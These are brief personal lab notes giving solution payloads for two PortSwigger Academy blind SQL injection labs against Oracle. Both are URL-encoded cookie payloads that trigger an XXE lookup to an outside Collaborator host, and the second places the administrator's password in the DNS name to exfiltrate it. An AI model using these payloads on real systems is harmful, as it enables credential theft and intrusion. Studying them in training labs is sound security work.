Was unable to perform the following since don't have Burp Collaborator Domain.

Ref: [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

# Blind SQL injection with out-of-band interaction

Solution (URL Encoded)
-- Oracle
`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

# Blind SQL injection with out-of-band data exfiltration

Solution (URL Encoded)
-- Oracle
`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
